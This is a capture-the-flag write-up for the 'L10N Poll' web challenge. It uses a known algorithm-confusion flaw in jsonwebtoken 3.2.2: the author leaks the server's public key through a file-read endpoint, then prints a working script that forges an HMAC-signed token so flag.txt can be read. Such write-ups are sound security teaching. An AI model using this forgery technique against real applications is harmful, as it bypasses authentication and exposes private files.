<h2>description: jsonwebtoken authentication bypass vulnerability.</h2>

<h1>L10N Poll</h1>

<h2>Problem</h2>

<p>I made the ultimate polling service! Il supporte tout les langues. Это потому, что на сайте используются передовые технологии локализации. ¿Puedes leer esto? أنا متأكد من أنني لا أستطيع. 立即开始！</p>

<p>(The flag is stored in <code>flag.txt</code>.)</p>

<h2>Solution</h2>

<p>We can see the dependencies in package.json:</p>

<p><code>javascript
{
  "dependencies": {
    "@koa/router": "^10.0.0",
    "jsonwebtoken": "^3.2.2",
    "koa": "^2.13.1",
    "koa-bodyparser": "^4.3.0",
    "koa-send": "^5.0.1",
    "koa-static": "^5.0.0"
  },
  "type": "module",
  "scripts": {
    "start": "node server.js"
  }
}
</code></p>

<p>A quick search tells us that <code>jsonwebtoken</code> 3.2.2 is vulnerable to an authentication bypass vulnerability.</p>

<p>{% embed url="https://snyk.io/test/npm/jsonwebtoken/3.2.2" %}</p>

<p>{% embed url="https://www.chosenplaintext.ca/2015/03/31/jwt-algorithm-confusion.html" %}</p>

<p><img src="../../.gitbook/assets/017a99bc69204175bbb6219e9bfaf862.png" alt="" /></p>

<p>And we can see that in the response for <code>/localization-file</code>, the JWT token is checked and the language is set according to the token value.</p>

<p><code>javascript
router.get("/localisation-file", async ctx =&gt; {
    const token = ctx.cookies.get("lion-token");
    /** @type {string} */
    let language;
    if (token) {
        const payload = await new Promise((resolve, reject) =&gt; {
            try {
                jwt.verify(token, publicKey, (err, result) =&gt; err ? reject(err) : resolve(result));
            } catch (e) {
                reject(e);
            }
        });
        language = payload.language;
    } else {
        language = languages[Math.floor(Math.random() * languages.length)].id;
        ctx.cookies.set("lion-token", generateToken(language));
    }
    await send(ctx, language, {root: __dirname});
});
</code></p>

<p>JWT tokens are essentially encoded JSON data. However, normally we cannot tamper the data because there is a signature that is verified at the server-side.</p>

<p><img src="../../.gitbook/assets/ac7743c88ff544e0ae9e90f681e35eaa.png" alt="" /></p>

<p>However, in this particular exploit, as long as we are able to get hold of the public key, we can trick the server into thinking that the received public key is actually an HMAC secret key. Since we would know the public key, we would be able to generate a valid private key!</p>

<p>How do we get the key? Well, we know that the key file is in the <code>__dirname</code> directory.</p>

<p><code>javascript
const publicKey = readFileSync(join(__dirname, "key"), "utf8");
</code></p>

<p>In the POST handler for <code>/localization-language</code>, we are able to control the <code>language</code> parameter to make the server generate a JWT token with the corresponding language in the <code>language</code> field.</p>

<p><code>javascript
router.post("/localization-language", async ctx =&gt; {
    const language = ctx.request.body?.language;
    if (typeof language === "string") {
        if (language.match(languageRegex)) {
            ctx.cookies.set("lion-token", generateToken(language));
        } else {
            ctx.throw(400, msgs[Math.floor(Math.random() * msgs.length)]);
        }
    } else {
        ctx.throw(400, "no language");
    }
    ctx.redirect("/");
});
</code></p>

<p>Then, in the GET handler for <code>/localisation-file</code>, the server would send us the file at <code>&lt;__dirname&gt;/&lt;language&gt;</code>. Hence, we are able to read arbitrary files.</p>

<p><code>javascript
await send(ctx, language, {root: __dirname});
</code></p>

<p>However, since we have to pass the following regex:</p>

<p><code>javascript
const languageRegex = /^[a-z]+$/;
</code></p>

<p>we cannot read <code>flag.txt</code> or <code>key.priv</code>.</p>

<p>Let's test out this theory. I sent a POST request to the <code>/localization-language</code> endpoint, with the JSON data:</p>

<p><code>javascript
{
    "language":   "key"
}
</code></p>

<p><img src="../../.gitbook/assets/ee5d3d569b3e4f2d932e525ea3a7c54b.png" alt="" /></p>

<p>This sets the <code>"language"</code> parameter to <code>"key"</code> in the JWT token.</p>

<p><img src="../../.gitbook/assets/0f76156bcbd645baa62bae08d0f87e8c.png" alt="" /></p>

<p>Then, let's send a GET request to <code>/localisation-file</code> to get the key file.</p>

<p><img src="../../.gitbook/assets/0f57f50377614e0ab8423a107342d193.png" alt="" /></p>

<p>We can sign the token using the public key, then send it to the server. Although the server expects an RSA public key, because of the vulnerability mentioned earier, it thinks that this is an HMAC private key.</p>

<p>Since the private key was generated from the server's public key, it is definitely valid and the server would accept it.</p>

<p>Here's the script that would generate the JWT payload:</p>

<p>```javascript
import jwt from 'jsonwebtoken';</p>

<p>var key = <code>-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCRaHtUpvSkcf2KCwXTiX48Tjxf
bUVFn7YimqGPQbwTnE0WfR5SxLK/DH0os9jCCeb7pJ08AbHFBzQNUfbg47xI3aJh
PMdjL/w3iqfc56C7lt59u4TeOYc7kguph/GTYDPDZkgtbkFJmbkbg9MvV723U1PW
M7N2P4b2Xf3p7ZtaewIDAQAB
-----END PUBLIC KEY-----</code>;</p>

<p>var tokenPayload = {
    "language": "flag.txt",
    "iat": 1623595244
};</p>

<p>var forgedToken = jwt.sign(tokenPayload, key);</p>

<p>console.log(forgedToken);</p>

<p>try{
    console.log(jwt.verify(forgedToken, key))
} catch (e) {
    console.log(e);
}
```</p>

<p>Note that you'll have to downgrade <code>jsonwebtoken</code> to version 3.2.2 to test whether the exploit works.</p>

<p>The token is successfully verified, which means that our payload worked. We have changed the <code>language</code> parameter to <code>flag.txt</code>.</p>

<p><img src="../../.gitbook/assets/3e8352d594494be689a0c33e3d8dfbe4.png" alt="" /></p>

<p>Plugging in this token value to our <code>lion-token</code> cookie, we can read <code>flag.txt</code>.</p>
